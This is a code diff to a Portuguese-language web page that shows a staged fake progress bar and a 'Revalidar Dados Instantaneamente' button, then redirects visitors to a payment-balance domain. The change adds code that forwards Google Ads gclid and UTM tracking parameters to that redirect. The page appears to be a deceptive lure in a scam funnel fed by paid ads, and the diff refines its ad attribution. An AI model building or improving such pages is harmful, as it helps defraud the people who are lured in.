@@ -19,24 +19,74 @@
              <p>Processo: <span id="status">Inicializando...</span></p>
              <button class="fake-button" onclick="skip()">Revalidar Dados Instantaneamente</button>
          </div>
-         <script>
-             let progress = 0;
-             const interval = setInterval(() => {
-                 progress += 5;
-                 document.getElementById("bar").style.width = `${progress}%`;
-                 document.getElementById("status").innerText = `${progress}% concluído`;
-                 if (progress >= 100) {
-                     clearInterval(interval);
-                     setTimeout(() => {
-                         window.location.href = "https://pagamentocerto.space/saldott/";
-                     }, 1000);
-                 }
-             }, 200);
+        <script>
+            // Progresso visual
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 5;
+                document.getElementById("bar").style.width = `${progress}%`;
+                document.getElementById("status").innerText = `${progress}% concluído`;
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        window.location.href = buildRedirectUrl("https://pagamentocerto.space/saldott/");
+                    }, 1000);
+                }
+            }, 200);
 
-             function skip() {
-                 clearInterval(interval);
-                 window.location.href = "https://pagamentocerto.space/saldott/"; // Force redirect manual
-             }
-         </script>
+            // Constrói URL de redirect adicionando UTM ou preservando gclid/UTMs existentes.
+            function getUTMDefaults() {
+                const defaults = {
+                    utm_source: "google",
+                    utm_medium: "cpc",
+                    utm_campaign: "campanha_padrao"
+                };
+                return Object.assign({}, defaults, window.UTM_OVERRIDES || {});
+            }
+
+            function buildRedirectUrl(base) {
+                try {
+                    const baseObj = new URL(base);
+                    const targetParams = new URLSearchParams(baseObj.search);
+                    const srcParams = new URLSearchParams(window.location.search);
+
+                    // Preserve gclid se presente na URL de origem
+                    if (srcParams.has('gclid') && !targetParams.has('gclid')) {
+                        targetParams.set('gclid', srcParams.get('gclid'));
+                    }
+
+                    const defaults = getUTMDefaults();
+                    const utmKeys = ['utm_source','utm_medium','utm_campaign','utm_term','utm_content'];
+
+                    utmKeys.forEach(key => {
+                        if (!targetParams.has(key)) {
+                            if (srcParams.has(key)) {
+                                targetParams.set(key, srcParams.get(key));
+                            } else if (defaults[key]) {
+                                targetParams.set(key, defaults[key]);
+                            }
+                        }
+                    });
+
+                    // Mapeamentos comuns do Google Ads (se estiverem presentes)
+                    if (!targetParams.has('utm_term') && srcParams.has('keyword')) {
+                        targetParams.set('utm_term', srcParams.get('keyword'));
+                    }
+                    if (!targetParams.has('utm_content') && srcParams.has('adcontent')) {
+                        targetParams.set('utm_content', srcParams.get('adcontent'));
+                    }
+
+                    baseObj.search = targetParams.toString();
+                    return baseObj.toString();
+                } catch (e) {
+                    return base; // fallback
+                }
+            }
+
+            function skip() {
+                clearInterval(interval);
+                window.location.href = buildRedirectUrl("https://pagamentocerto.space/saldott/");
+            }
+        </script>
      </body>
      </html>
